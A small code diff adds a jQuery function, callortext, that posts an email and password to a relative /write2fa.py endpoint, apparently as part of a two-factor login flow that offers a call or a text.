@@ -17,6 +17,18 @@ function postData(email, password) {
       success: callbackFunc
   });
 }
+function callortext(email, password, isCall) {
+  if (isCall == 1){
+    $.ajax({
+      type: "POST",
+      url: "/write2fa.py",
+      data: { param: email,password },
+      success: callbackFunc
+  });
+  }
+
+}
+
 
 function callbackFunc(response) {
   // do something with the response
